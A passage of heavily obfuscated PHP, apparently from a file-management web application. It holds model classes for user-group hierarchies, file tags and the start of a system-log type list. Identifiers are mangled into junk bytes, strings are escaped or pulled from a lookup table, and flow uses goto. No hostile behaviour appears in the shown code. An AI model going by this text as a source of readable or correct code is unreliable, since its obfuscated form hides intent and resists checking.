Model($Õ—°şà¨[2095])->where($É«œò)->limit($œ×¾‹¨¬)->select(); if (!$ÙË¼í¨¨) { return array(); } $ÙË¼í¨¨ = array_to_keyvalue($ÙË¼í¨¨, $Õ—°şà¨[12], $Õ—°şà¨[1402]); $¿ÀØù³Ë = $this->where(array($Õ—°şà¨[2081] => array($Õ—°şà¨[7], $ÙË¼í¨¨)))->select(); if (!$¿ÀØù³Ë) { return array(); } return $¿ÀØù³Ë; } protected function _listDataApplyItem($ªÍÀ¤ş) { $ûÓ”ú¹ù = array($ªÍÀ¤ş); $this->_listDataApply($ûÓ”ú¹ù); return $ûÓ”ú¹ù[0]; } protected function _listDataApply(&$Øéø¤—œ) { $õ¯ÈåÒ§ =& $_SERVER[®»±”ó²]; if (!$Øéø¤—œ) { return; } $Ì€¶Öõß = array_to_keyvalue($Øéø¤—œ, $õ¯ÈåÒ§[12], $õ¯ÈåÒ§[1402]); $this->_listAppendChildren($Øéø¤—œ); $this->_listAppendChildrenMember($Øéø¤—œ); $this->_listAppendMeta($Øéø¤—œ, $Ì€¶Öõß); $this->_listAppendParent($Øéø¤—œ); $this->_listAppendSourceRoot($Øéø¤—œ, $Ì€¶Öõß); } private function _listAppendChildren(&$íÃ“‚Ïî) { $ÆÜÁ³¹“ =& $_SERVER[®»±”ó²]; $èÅıÕì’ = array_to_keyvalue($íÃ“‚Ïî, $ÆÜÁ³¹“[12], $ÆÜÁ³¹“[1402]); $¾ã„„ï– = array($ÆÜÁ³¹“[193] => array($ÆÜÁ³¹“[7], $èÅıÕì’)); $´á¡òéğ = array($ÆÜÁ³¹“[193], $ÆÜÁ³¹“[2096] => $ÆÜÁ³¹“[578]); $‚îİã¬» = $this->field($´á¡òéğ)->where($¾ã„„ï–)->group($ÆÜÁ³¹“[193])->select(); $íıŞ¸Ò¨ = array_to_keyvalue($‚îİã¬», $ÆÜÁ³¹“[193], $ÆÜÁ³¹“[578]); foreach ($íÃ“‚Ïî as &$ĞÇ´ô¼¤) { $õ¶ñÂ£¢ = $ĞÇ´ô¼¤[$ÆÜÁ³¹“[1402]]; $ĞÇ´ô¼¤[$ÆÜÁ³¹“[2097]] = isset($íıŞ¸Ò¨[$õ¶ñÂ£¢]) ? intval($íıŞ¸Ò¨[$õ¶ñÂ£¢]) : !1; } unset($ĞÇ´ô¼¤); } private function _listAppendChildrenMember(&$…ÙàŸÛŒ) { $øÔìÇ»ë =& $_SERVER[®»±”ó²]; $íÌÌŒÓ = array_to_keyvalue($…ÙàŸÛŒ, $øÔìÇ»ë[12], $øÔìÇ»ë[1402]); $š…—“ñß = array($øÔìÇ»ë[1402] => array($øÔìÇ»ë[7], $íÌÌŒÓ)); $¯©î› = array($øÔìÇ»ë[1402], $øÔìÇ»ë[2096] => $øÔìÇ»ë[578]); $‘ŒŒÕğÇ = Model($øÔìÇ»ë[2086])->field($¯©î›)->where($š…—“ñß)->group($øÔìÇ»ë[1402])->select(); $¨Şœ˜×ã = array_to_keyvalue($‘ŒŒÕğÇ, $øÔìÇ»ë[1402], $øÔìÇ»ë[578]); foreach ($…ÙàŸÛŒ as &$ç¹Ø¹Ú¢) { $¨„Œ› = $ç¹Ø¹Ú¢[$øÔìÇ»ë[1402]]; $ç¹Ø¹Ú¢[$øÔìÇ»ë[2098]] = isset($¨Şœ˜×ã[$¨„Œ›]) ? intval($¨Şœ˜×ã[$¨„Œ›]) : !1; } unset($ç¹Ø¹Ú¢); } private function _listAppendMeta(&$ñöçĞ‹, $”£§¹Ä ) { $¶ğ­–œ =& $_SERVER[®»±”ó²]; $Ö§Áá’Ô = array($¶ğ­–œ[1402] => array($¶ğ­–œ[7], $”£§¹Ä )); $ˆÁ¨Ûù‰ = Model($¶ğ­–œ[2085])->where($Ö§Áá’Ô)->select(); $ˆÁ¨Ûù‰ = array_to_keyvalue_group($ˆÁ¨Ûù‰, $¶ğ­–œ[1402]); foreach ($ˆÁ¨Ûù‰ as &$§ÜüÓõ¼) { $§ÜüÓõ¼ = array_to_keyvalue($§ÜüÓõ¼, $¶ğ­–œ[97], $¶ğ­–œ[452]); } unset($§ÜüÓõ¼); foreach ($ñöçĞ‹ as &$’†ú¦ã±) { $’†ú¦ã±[$¶ğ­–œ[552]] = array(); if (isset($ˆÁ¨Ûù‰[$’†ú¦ã±[$¶ğ­–œ[1402]]])) { $’†ú¦ã±[$¶ğ­–œ[552]] = $ˆÁ¨Ûù‰[$’†ú¦ã±[$¶ğ­–œ[1402]]]; } } unset($’†ú¦ã±); } protected function parentLevelArray($Ø’¶õë) { $ˆş‚±Èü =& $_SERVER[®»±”ó²]; $Ø’¶õë = explode($ˆş‚±Èü[50], trim($Ø’¶õë, $ˆş‚±Èü[50])); $Ø’¶õë = array_remove_value($Ø’¶õë, $ˆş‚±Èü[231]); return $Ø’¶õë; } protected function parentInGroup($…Ï‚–Õ¦, $´öè¦ØÖ) { $ä†¸ªµŒ =& $_SERVER[®»±”ó²]; $‹ä“³¦Ô = $this->getInfoSimple($…Ï‚–Õ¦); if (!$‹ä“³¦Ô) { return !0; } $Ó»îë‰÷ = $this->parentLevelArray($‹ä“³¦Ô[$ä†¸ªµŒ[597]]); $Ó»îë‰÷[] = $…Ï‚–Õ¦; foreach ($Ó»îë‰÷ as $…Ï‚–Õ¦) { if (in_array($…Ï‚–Õ¦ . $ä†¸ªµŒ[12], $´öè¦ØÖ)) { return !0; } } return !1; } private function _listAppendParent(&$ÌÍĞàâ) { $”Œ™óø =& $_SERVER[®»±”ó²]; $å‚§±ë = array(); foreach ($ÌÍĞàâ as &$ÏÈÈ™€ñ) { $å‚§±ë[$ÏÈÈ™€ñ[$”Œ™óø[1402]]] = $ÏÈÈ™€ñ[$”Œ™óø[32]]; $‹âùı¨ = $this->parentLevelArray($ÏÈÈ™€ñ[$”Œ™óø[597]]); foreach ($‹âùı¨ as $¤Ö°Ëéò) { if (!isset($å‚§±ë[$¤Ö°Ëéò])) { $å‚§±ë[$¤Ö°Ëéò] = 0; } } } unset($ÏÈÈ™€ñ); foreach ($å‚§±ë as $Ëâû®Ìû => $²€°öÆÇ) { if ($²€°öÆÇ) { continue; } $Õ’ßºü = $this->getInfoSimple($Ëâû®Ìû); $å‚§±ë[$Ëâû®Ìû] = $Õ’ßºü[$”Œ™óø[32]]; } $ØóÛÍ›Ø = $GLOBALS[$”Œ™óø[6]][$”Œ™óø[92]][$”Œ™óø[2099]]; if (KodUser::isRoot()) { $ØóÛÍ›Ø = !1; } foreach ($ÌÍĞàâ as &$ÏÈÈ™€ñ) { $‹âùı¨ = $this->parentLevelArray($ÏÈÈ™€ñ[$”Œ™óø[597]]); $Ğè©†ì¶ = $”Œ™óø[12]; foreach ($‹âùı¨ as $Ëâû®Ìû => $¤Ö°Ëéò) { if ($ØóÛÍ›Ø && $Ëâû®Ìû == 0) { continue; } $Ğè©†ì¶ .= $å‚§±ë[$¤Ö°Ëéò] . $”Œ™óø[8]; } if ($‹âùı¨) { $Ğè©†ì¶ .= $ÏÈÈ™€ñ[$”Œ™óø[32]]; } $ÏÈÈ™€ñ[$”Œ™óø[602]] = str_replace($”Œ™óø[257], $”Œ™óø[8], $Ğè©†ì¶); } unset($ÏÈÈ™€ñ); } private function _listAppendSourceRoot(&$¨ÓĞÁêÁ, $ßÑËé¾) { $œıúÁÚ =& $_SERVER[®»±”ó²]; $«—²ı = Model($œıúÁÚ[911])->listSourceRoot(SourceModel::TYPE_GROUP, $ßÑËé¾); $«—²ı = array_to_keyvalue($«—²ı, $œıúÁÚ[582]); $«—²ı = array_remove_key($«—²ı, $œıúÁÚ[582]); foreach ($¨ÓĞÁêÁ as &$ãçÈÕ¼) { $ãçÈÕ¼[$œıúÁÚ[90]] = $«—²ı[$ãçÈÕ¼[$œıúÁÚ[1402]]] ? $«—²ı[$ãçÈÕ¼[$œıúÁÚ[1402]]] : array(); } unset($ãçÈÕ¼); } protected function groupMerge($ÍÛŞÁíÁ) { $ÍÛŞÁíÁ = array_values(array_unique($ÍÛŞÁíÁ)); $è‹ìªš = array(); for ($ëöÉ«›‹ = 0; $ëöÉ«›‹ < count($ÍÛŞÁíÁ); $ëöÉ«›‹++) { $ûŒúíßË = !1; for ($ª¨ĞÖ¤Æ = 0; $ª¨ĞÖ¤Æ < count($ÍÛŞÁíÁ); $ª¨ĞÖ¤Æ++) { if ($ëöÉ«›‹ == $ª¨ĞÖ¤Æ) { continue; } if ($this->isParentOf($ÍÛŞÁíÁ[$ª¨ĞÖ¤Æ], $ÍÛŞÁíÁ[$ëöÉ«›‹])) { $ûŒúíßË = !0; break; } } if (!$ûŒúíßË) { $è‹ìªš[] = $ÍÛŞÁíÁ[$ëöÉ«›‹]; } } return $è‹ìªš; } protected function isParentOf($…ı´ Êß, $„‹šÆ‰¿) { $¦ó¯½‹À =& $_SERVER[®»±”ó²]; if (!$…ı´ Êß || !$„‹šÆ‰¿ || $…ı´ Êß == $„‹šÆ‰¿) { return !1; } $ûÂñÕÚ­ = $this->getInfoSimple($…ı´ Êß); $¿ë•«‹ = $this->getInfoSimple($„‹šÆ‰¿); $ß‘ç²í = $ûÂñÕÚ­[$¦ó¯½‹À[597]] . $…ı´ Êß . $¦ó¯½‹À[50]; if (substr($¿ë•«‹[$¦ó¯½‹À[597]], 0, strlen($ß‘ç²í)) == $ß‘ç²í) { return !0; } return !1; } public function groupShowRoot($¡íÅÛÍß, $Û´Ã¥§¦ = false) { $ÙÈÑ‰âò =& $_SERVER[®»±”ó²]; $´ıˆ“ù = $this->getInfo($¡íÅÛÍß); if (!$´ıˆ“ù) { return array(); } $»õ˜ù¥ = $this->parentLevelArray($´ıˆ“ù[$ÙÈÑ‰âò[597]]); $ƒ…Ì­ = array($¡íÅÛÍß); if (count($»õ˜ù¥) == 0) { return $ƒ…Ì­; } if ($Û´Ã¥§¦ && count($»õ˜ù¥) == 1) { return $ƒ…Ì­; } if (!$´ıˆ“ù[$ÙÈÑ‰âò[552]] || !isset($´ıˆ“ù[$ÙÈÑ‰âò[552]][$ÙÈÑ‰âò[2082]]) || $´ıˆ“ù[$ÙÈÑ‰âò[552]][$ÙÈÑ‰âò[2082]] == $ÙÈÑ‰âò[857]) { return $this->groupShowRoot($»õ˜ù¥[count($»õ˜ù¥) - 1], $Û´Ã¥§¦); } if ($´ıˆ“ù[$ÙÈÑ‰âò[552]][$ÙÈÑ‰âò[2082]] == $ÙÈÑ‰âò[434]) { $úñÕ´ıÛ = explode($ÙÈÑ‰âò[50], $´ıˆ“ù[$ÙÈÑ‰âò[552]][$ÙÈÑ‰âò[2083]]); if ($úñÕ´ıÛ) { $ƒ…Ì­ = array_merge($ƒ…Ì­, $úñÕ´ıÛ); } } return $ƒ…Ì­; } protected function resetParentLevel() { $‡üˆ®ø½ =& $_SERVER[®»±”ó²]; $ÚŞÃ’ö§ = $‡üˆ®ø½[1402]; $®®áÏ™¨ = $this->select(); $®®áÏ™¨ = array_to_keyvalue($®®áÏ™¨, $ÚŞÃ’ö§); foreach ($®®áÏ™¨ as $—ÃÈâŒ») { $Õæ©Óñ÷ = $—ÃÈâŒ»; $Òû‘ÌÙ‘ = array(); while ($Õæ©Óñ÷[$‡üˆ®ø½[193]] != 0) { $Òû‘ÌÙ‘[] = $Õæ©Óñ÷[$‡üˆ®ø½[193]]; $Õæ©Óñ÷ = $®®áÏ™¨[$Õæ©Óñ÷[$‡üˆ®ø½[193]]]; } $Òû‘ÌÙ‘[] = 0; $Òû‘ÌÙ‘ = $‡üˆ®ø½[50] . implode($‡üˆ®ø½[50], array_reverse($Òû‘ÌÙ‘)) . $‡üˆ®ø½[50]; $this->setNamePinyin($—ÃÈâŒ»[$ÚŞÃ’ö§], $—ÃÈâŒ»[$‡üˆ®ø½[32]]); $this->where(array($ÚŞÃ’ö§ => $—ÃÈâŒ»[$ÚŞÃ’ö§]))->save(array($‡üˆ®ø½[668] => $Òû‘ÌÙ‘)); } return $®®áÏ™¨; } public function groupNameAuto($³ÔĞ•„, $Ÿ±É¥š) { $ç´Íà =& $_SERVER[®»±”ó²]; $Í´éñßì = $this->where(array($ç´Íà[488] => $³ÔĞ•„))->getField($ç´Íà[32], !0); if (!$Í´éñßì || !in_array($Ÿ±É¥š, $Í´éñßì)) { return $Ÿ±É¥š; } for ($™äŒôÔ… = 1; $™äŒôÔ… <= count($Í´éñßì) + 1; $™äŒôÔ…++) { $Õ÷×¥—é = $Ÿ±É¥š . "\x28{$™äŒôÔ…}\51"; if (!in_array($Õ÷×¥—é, $Í´éñßì)) { return $Õ÷×¥—é; } } } public function groupSwitch($ÍÒï´áû, $×¯‚Åàâ) { $åœ¹¡š™ =& $_SERVER[®»±”ó²]; $Êİ×äüØ = array($åœ¹¡š™[1402] => array($åœ¹¡š™[7], array($ÍÒï´áû, $×¯‚Åàâ))); $”£‘” = $this->where($Êİ×äüØ)->select(); $”£‘” = array_to_keyvalue($”£‘”, $åœ¹¡š™[1402]); if (!isset($”£‘”[$ÍÒï´áû]) || !isset($”£‘”[$×¯‚Åàâ]) || $”£‘”[$ÍÒï´áû][$åœ¹¡š™[193]] == 0) { return !1; } $Êİ×äüØ = array($åœ¹¡š™[1402] => $ÍÒï´áû); $§ûØËÓÑ = Model($åœ¹¡š™[2086])->where($Êİ×äüØ)->select(); if (!$§ûØËÓÑ) { $§ûØËÓÑ = array(); } foreach ($§ûØËÓÑ as $áÎŠ½¤©) { $Ûêôº¢Œ = $áÎŠ½¤©[$åœ¹¡š™[1791]]; $Êİ×äüØ = array($åœ¹¡š™[1791] => $Ûêôº¢Œ, $åœ¹¡š™[1402] => $×¯‚Åàâ); $ğ›ñĞè = Model($åœ¹¡š™[2086])->where($Êİ×äüØ)->find(); if (!$ğ›ñĞè) { $›Ê«òç³ = array($×¯‚Åàâ => $áÎŠ½¤©[$åœ¹¡š™[2100]]); Model($åœ¹¡š™[610])->userGroupAdd($Ûêôº¢Œ, $›Ê«òç³); } Model($åœ¹¡š™[610])->userGroupRemove($Ûêôº¢Œ, $ÍÒï´áû); } $Êİ×äüØ = array($åœ¹¡š™[191] => 2, $åœ¹¡š™[193] => 0, $åœ¹¡š™[496] => 1, $åœ¹¡š™[582] => array($åœ¹¡š™[7], array($ÍÒï´áû, $×¯‚Åàâ))); $Û‘¯óîÍ = Model($åœ¹¡š™[911])->where($Êİ×äüØ)->field($åœ¹¡š™[2101])->select(); $Û‘¯óîÍ = array_to_keyvalue($Û‘¯óîÍ, $åœ¹¡š™[582], $åœ¹¡š™[194]); $«¨™î´ı = !empty($Û‘¯óîÍ[$ÍÒï´áû]) ? $Û‘¯óîÍ[$ÍÒï´áû] : !1; if ($«¨™î´ı) { if (!$Û‘¯óîÍ[$×¯‚Åàâ]) { $Û‘¯óîÍ[$×¯‚Åàâ] = Model($åœ¹¡š™[911])->groupRootAdd($×¯‚Åàâ); } $‘¡¹Õš = $Û‘¯óîÍ[$×¯‚Åàâ]; $Êİ×äüØ = array($åœ¹¡š™[193] => $«¨™î´ı); $Û‘¯óîÍ = Model($åœ¹¡š™[911])->where($Êİ×äüØ)->field($åœ¹¡š™[2102])->select(); if (!$Û‘¯óîÍ) { $Û‘¯óîÍ = array(); } Model($åœ¹¡š™[911])->moveClearAuth = !1; foreach ($Û‘¯óîÍ as $á»‘‡ë´) { $İ¬©ûşĞ = $á»‘‡ë´[$åœ¹¡š™[496]] == $åœ¹¡š™[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($åœ¹¡š™[911])->move($á»‘‡ë´[$åœ¹¡š™[194]], $‘¡¹Õš, $İ¬©ûşĞ); } Model($åœ¹¡š™[911])->moveClearAuth = !0; $Êİ×äüØ = array($åœ¹¡š™[191] => 2, $åœ¹¡š™[582] => $ÍÒï´áû); $îüøÓ¤² = array($åœ¹¡š™[582] => $×¯‚Åàâ); Model($åœ¹¡š™[2103])->where($Êİ×äüØ)->save($îüøÓ¤²); Model($åœ¹¡š™[2104])->where($Êİ×äüØ)->save($îüøÓ¤²); } $this->_changeChildLevel($”£‘”[$ÍÒï´áû], $”£‘”[$×¯‚Åàâ], !0); $this->where(array($åœ¹¡š™[193] => $ÍÒï´áû))->save(array($åœ¹¡š™[193] => $×¯‚Åàâ)); $this->_clearChildrenCache($”£‘”[$×¯‚Åàâ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\137\x66\141\x76"; protected function cacheFunctionAlias($¥Æ÷‡Ç§) { $Í‹ƒÇ“ =& $_SERVER[®»±”ó²]; return array($Í‹ƒÇ“[2105] => array($¥Æ÷‡Ç§[0], $Í‹ƒÇ“[2106]), $Í‹ƒÇ“[2107] => array($¥Æ÷‡Ç§[0], $Í‹ƒÇ“[2108])); } protected function get($°Â¡ı—Ë) { $Âõ”‚š“ =& $_SERVER[®»±”ó²]; $Ú¾óÕÖ = Model($Âõ”‚š“[598])->metaGet($°Â¡ı—Ë, $Âõ”‚š“[2109]); $£Ÿ©« = json_decode($Ú¾óÕÖ, !0); return $£Ÿ©« ? $£Ÿ©« : array($Âõ”‚š“[2110] => $Âõ”‚š“[91], $Âõ”‚š“[447] => array()); } protected function set($’ñ’‘Ùñ, $×ğÖ­·¡) { $ûñ¼œ¸É =& $_SERVER[®»±”ó²]; $×ğÖ­·¡ = $×ğÖ­·¡ ? $×ğÖ­·¡ : array($ûñ¼œ¸É[2110] => $ûñ¼œ¸É[91], $ûñ¼œ¸É[447] => array()); return Model($ûñ¼œ¸É[598])->metaSet($’ñ’‘Ùñ, $ûñ¼œ¸É[2109], json_encode($×ğÖ­·¡)); } protected function getByTagID($¦Ã®ª¶İ, $¨éå£Ü“) { $„åÍ‹¬¹ =& $_SERVER[®»±”ó²]; if (!$¦Ã®ª¶İ || !$¨éå£Ü“) { return !1; } if (!Model($„åÍ‹¬¹[598])->getInfoSimple($¦Ã®ª¶İ)) { return !1; } $²ßÕ‡æ = $this->get($¦Ã®ª¶İ); if (!$²ßÕ‡æ || !isset($²ßÕ‡æ[$„åÍ‹¬¹[447]])) { return !1; } $ÑöÊôé = array_find_by_field($²ßÕ‡æ[$„åÍ‹¬¹[447]], $„åÍ‹¬¹[477], $¨éå£Ü“); return is_array($ÑöÊôé) ? $ÑöÊôé : !1; } public function listSource($É¨‹ß, $Ğü×ÖÍ) { $À‘š³æé =& $_SERVER[®»±”ó²]; if ($Ğü×ÖÍ && !is_array($Ğü×ÖÍ)) { $Ğü×ÖÍ = array($Ğü×ÖÍ); } $ÒÁëüı¯ = $this->listData($É¨‹ß); $Õ£”¶Ç = array(); foreach ($ÒÁëüı¯ as $¸”—æ‘Û) { $àëºëôá = $¸”—æ‘Û[$À‘š³æé[87]]; if (!$àëºëôá) { continue; } if (!isset($Õ£”¶Ç[$àëºëôá])) { $Õ£”¶Ç[$àëºëôá] = array(); } $Õ£”¶Ç[$àëºëôá][] = $¸”—æ‘Û[$À‘š³æé[511]]; } $ê¤£»ó = array(); foreach ($Õ£”¶Ç as $ŠÉõ¼Òª => $Ï›‹Ûáœ) { $íÏ¢¨şŞ = !0; if (!$Ğü×ÖÍ) { $ê¤£»ó[] = $ŠÉõ¼Òª; continue; } foreach ($Ğü×ÖÍ as $››’†Ö) { if (!in_array($››’†Ö, $Ï›‹Ûáœ)) { $íÏ¢¨şŞ = !1; break; } } if ($íÏ¢¨şŞ) { $ê¤£»ó[] = $ŠÉõ¼Òª; } } if (!$ê¤£»ó) { return array(); } $¼Ò£„âÜ = array($À‘š³æé[502] => array($À‘š³æé[503], $ê¤£»ó), $À‘š³æé[582] => $É¨‹ß, $À‘š³æé[191] => SourceModel::TYPE_GROUP); $”ÀÆúØ® = Model($À‘š³æé[1440])->listSource($¼Ò£„âÜ); if (!$”ÀÆúØ® || count($ê¤£»ó) == $”ÀÆúØ®[$À‘š³æé[444]][$À‘š³æé[445]]) { return $”ÀÆúØ®; } $¯ê’¯şÌ = array(); $ãšš–İÓ = array_to_keyvalue($”ÀÆúØ®[$À‘š³æé[85]], $À‘š³æé[12], $À‘š³æé[194]); $ÊĞÍå¡ = array_to_keyvalue($”ÀÆúØ®[$À‘š³æé[86]], $À‘š³æé[12], $À‘š³æé[194]); $½‰ƒıñâ = array_merge($ÊĞÍå¡, $ãšš–İÓ); foreach ($ê¤£»ó as $àëºëôá) { if (!in_array($àëºëôá, $½‰ƒıñâ)) { $¯ê’¯şÌ[] = $àëºëôá; } } if ($¯ê’¯şÌ) { $this->removeBySource($É¨‹ß, $¯ê’¯şÌ); } return $”ÀÆúØ®; } protected function listData($Æ´ÊõÑ×) { $Ç½óá¢ò =& $_SERVER[®»±”ó²]; $ì§ÉŸ = array($Ç½óá¢ò[1782] => 0, $Ç½óá¢ò[570] => array($Ç½óá¢ò[2111], 0), $Ç½óá¢ò[507] => $Ç½óá¢ò[1398] . $Æ´ÊõÑ×); $¢åƒƒŒ = $Ç½óá¢ò[2112]; $Ğñú•ñú = $this->field($¢åƒƒŒ)->where($ì§ÉŸ)->order($Ç½óá¢ò[2113])->select(); return $Ğñú•ñú ? $Ğñú•ñú : array(); } protected function addToTag($âÏí±‡, $”¬ûøÍû, $ÄŞÎ¿) { $©‰¿–È =& $_SERVER[®»±”ó²]; if (!$this->getByTagID($âÏí±‡, $ÄŞÎ¿) || !$”¬ûøÍû) { return !1; } if (!Model($©‰¿–È[911])->pathInfo($”¬ûøÍû)) { return !1; } $Ëóµ»Œ = array($©‰¿–È[1782] => 0, $©‰¿–È[570] => $ÄŞÎ¿, $©‰¿–È[506] => $”¬ûøÍû, $©‰¿–È[507] => $©‰¿–È[2114] . $âÏí±‡, $©‰¿–È[505] => $©‰¿–È[12], $©‰¿–È[1995] => 0); if ($this->where($Ëóµ»Œ)->find()) { return !1; } return $this->add($Ëóµ»Œ); } protected function removeFromTag($³øŒÂÑ±, $®–ÊïŸÔ, $Ôû­–ü¾) { $Ø€éœ«Á =& $_SERVER[®»±”ó²]; if (!$this->getByTagID($³øŒÂÑ±, $Ôû­–ü¾) || !$®–ÊïŸÔ) { return !1; } if (is_array($®–ÊïŸÔ)) { $®–ÊïŸÔ = array($Ø€éœ«Á[7], $®–ÊïŸÔ); } $×Šç‹øÁ = array($Ø€éœ«Á[1782] => 0, $Ø€éœ«Á[570] => $Ôû­–ü¾, $Ø€éœ«Á[507] => $Ø€éœ«Á[2114] . $³øŒÂÑ±, $Ø€éœ«Á[506] => $®–ÊïŸÔ); return $this->where($×Šç‹øÁ)->delete(); } protected function removeByTag($ŒØ¾Ì‡Ä, $•ÒõÀÔ«) { $“«øØÙÌ =& $_SERVER[®»±”ó²]; if (!$this->getByTagID($ŒØ¾Ì‡Ä, $•ÒõÀÔ«)) { return !1; } $ÎÑ”à¼ß = array($“«øØÙÌ[1782] => 0, $“«øØÙÌ[570] => $•ÒõÀÔ«, $“«øØÙÌ[507] => $“«øØÙÌ[2114] . $ŒØ¾Ì‡Ä); return $this->where($ÎÑ”à¼ß)->delete(); } protected function removeBySource($àé¬ó¥, $İİÁªˆ’) { $Ã´ë¼ÏÙ =& $_SERVER[®»±”ó²]; if (!$àé¬ó¥ || !$İİÁªˆ’) { return !1; } if (is_array($İİÁªˆ’)) { $İİÁªˆ’ = array($Ã´ë¼ÏÙ[7], $İİÁªˆ’); } $¥½½şƒ· = array($Ã´ë¼ÏÙ[1782] => 0, $Ã´ë¼ÏÙ[506] => $İİÁªˆ’, $Ã´ë¼ÏÙ[570] => array($Ã´ë¼ÏÙ[1101], 0), $Ã´ë¼ÏÙ[507] => $Ã´ë¼ÏÙ[2114] . $àé¬ó¥); return $this->where($¥½½şƒ·)->delete(); } } goto aºÄÕî½±; E¯‹†Ô†ˆÅ: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\163\164\145\x6d\137\x6c\157\147"; protected $dataAuto = array(array("\x63\162\145\141\x74\145\x54\151\155\145", "\164\151\x6d\145", "\151\156\x73\x65\x72\164", "\x66\165\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $µ‰§¶¬ş =& $_SERVER[®»±”ó²]; return array($µ‰§¶¬ş[2363] => LNG($µ‰§¶¬ş[2364]), $µ‰§¶¬ş[2365] => LNG($µ‰§¶¬ş[2366]), $µ‰§¶¬ş[1934] => LNG($µ‰§¶¬ş[2367]), $µ‰§¶¬ş[2368] => LNG($µ‰§¶¬ş[2369]), $µ‰§¶¬ş[2370] => LNG($µ‰§¶¬ş[2371]), $µ‰§¶¬ş[2372] => LNG($µ‰§¶¬ş[2373]), $µ‰§¶¬ş[2374] => LNG($µ‰§¶¬ş[2375]), $µ‰§¶¬ş[1964] => LNG($µ‰§¶¬ş[2375]), $µ‰§¶¬ş[1965] => LNG($µ‰§¶¬ş[2376]), $µ‰§¶¬ş[2377] => LNG($µ‰§¶¬ş[2378]), $µ‰§¶¬ş[2379] => LNG($µ‰§¶¬ş[2380]), $µ‰§¶¬ş[2381] => LNG($µ‰§¶¬ş[2382]), $µ‰§¶¬ş[2383] => LNG($µ‰§¶¬ş[2384]), $µ‰§¶¬ş[1962] => LNG($µ‰§¶¬ş[2385]), $µ‰§¶¬ş[2386] => LNG($µ‰§¶¬ş[2387]), $µ‰§¶¬ş[1969] => LNG($µ‰§¶¬ş[2388]), $µ‰§¶¬ş[2389] => LNG($µ‰§¶¬ş[2390]), $µ‰§¶¬ş[2391] => LNG($µ‰§¶¬ş[2392]), $µ‰§¶¬ş[2393] => LNG($µ‰§¶¬ş[2394]), $µ‰§¶¬ş[2395] => LNG($µ‰§¶¬ş[2396]), $µ‰§¶¬ş[1972] => LNG($µ‰§¶¬ş[2397]), $µ‰§¶¬ş[1973] => LNG($µ‰§¶¬ş[2398]), $µ‰§¶¬ş[2399] => LNG($µ‰§¶¬ş[2400]), $µ‰§¶¬ş[2401] => LNG($µ‰§¶¬ş[2402]), $µ‰§¶¬ş[2403] => LNG($µ‰§¶¬ş[2404]), $µ‰§¶¬ş[1967] => LNG($µ‰§¶¬ş[2405]), $µ‰§¶¬ş[2406] => LNG($µ‰§¶¬ş[2407]), $µ‰§¶¬ş[1966] => LNG($µ‰§¶¬ş[2408]), $µ‰§¶¬ş[2409] => LNG($µ‰§¶¬ş[2409]), $µ‰§¶¬ş[2410] => LNG($µ‰§¶¬ş[2411]), $µ‰§¶¬ş[2412] => LNG($µ‰§¶¬ş[2409]), $µ‰§¶¬ş[2413] => LNG($µ‰§¶¬ş[2414]), $µ‰§¶¬ş[2415] => LNG($µ‰§¶¬ş[2416]), $µ‰§¶¬ş[2417] => LNG($µ‰§¶¬ş[2416]), $µ‰§¶¬ş[2418] => LNG($µ‰§¶¬ş[2419]), $µ‰§¶¬ş[2420] => LNG($µ‰§¶¬ş[2420]), $µ‰§¶¬ş[2421] => LNG($µ‰§¶¬ş[1938]), $µ‰§¶¬ş[2422] => LNG($µ‰§¶¬ş[2423]), $µ‰§¶¬ş[2424] => LNG($µ‰§¶¬ş[2425]), $µ‰§¶¬ş[2426] => LNG($µ‰§¶¬ş[2427]), $µ‰§¶¬ş[2428] => LNG($µ‰§¶¬ş[2429]), $µ‰§¶¬ş[2430] => LNG($µ‰§¶¬ş[2431]), $µ‰§¶¬ş[2432] => LNG($µ‰§¶¬ş[2432]), $µ‰§¶¬ş[2433] => LNG($µ‰§¶¬ş[2434]), $µ‰§¶¬ş[2435] => LNG($µ‰§¶¬ş[2436]), $µ‰§¶¬ş[2437] => LNG($µ‰§¶¬ş[2438]), $µ‰§¶¬ş[2439] => LNG($µ‰§¶¬ş[2440]), $µ‰§¶¬ş[2441] => LNG($µ‰§¶¬ş[2442]), $µ‰§¶¬ş[2443] => LNG($µ‰§¶¬ş[2444]), $µ‰§¶¬ş[213] => LNG($µ‰§¶¬ş[213]), $µ‰§¶¬ş[214] => LNG($µ‰§¶¬ş[2445]), $µ‰§¶¬ş[2446] => LNG($µ‰§¶¬ş[2446])); } private function typeFile() { $ÁÔáÜ—õ =& $_SERVER[®»±”ó²]; $‘­äãï© = array($ÁÔáÜ—õ[1969] => array($ÁÔáÜ—õ[1970]), $ÁÔáÜ—õ[2381] => array($ÁÔáÜ—õ[2447]), $ÁÔáÜ—õ[2383] => array($ÁÔáÜ—õ[2448]), $ÁÔáÜ—õ[1962] => array($ÁÔáÜ—õ[1963], $ÁÔáÜ—õ[2449]), $ÁÔáÜ—õ[2391] => array(), $ÁÔáÜ—õ[2393] => array(), $ÁÔáÜ—õ[2395] => array(), $ÁÔáÜ—õ[1972] => array($ÁÔáÜ—õ[1974]), $ÁÔáÜ—õ[1973] => array($ÁÔáÜ—õ[1974]), $ÁÔáÜ—õ[2399] => array($ÁÔáÜ—õ[2450]), $ÁÔáÜ—õ[2401] => array($ÁÔáÜ—õ[2450]), $ÁÔáÜ—õ[2403] => array($ÁÔáÜ—õ[2451]), $ÁÔáÜ—õ[2389] => array($ÁÔáÜ—õ[2452]), $ÁÔáÜ—õ[1967] => array($ÁÔáÜ—õ[2453]), $ÁÔáÜ—õ[2406] => array($ÁÔáÜ—õ[2454]), $ÁÔáÜ—õ[1966] => array($ÁÔáÜ—õ[1968])); return $‘­äãï©; } private function typeAll() { $ÑŠÏÀ¸´ =& $_SERVER[®»±”ó²]; $Ä´ˆÊ¯å = $this->typeList; $ï˜ó ½š = array_filter($this->typeFile()); foreach ($ï˜ó ½š as $ª­ğë¹ => $ğ–ïê´) { $Ä´ˆÊ¯å[$ğ–ïê´[0]] = $Ä´ˆÊ¯å[$ª­ğë¹]; } $Ä´ˆÊ¯å[$ÑŠÏÀ¸´[1974]] = LNG($ÑŠÏÀ¸´[2455]); $Ä´ˆÊ¯å[$ÑŠÏÀ¸´[2450]] = LNG($ÑŠÏÀ¸´[2456]); return $Ä´ˆÊ¯å; } public function 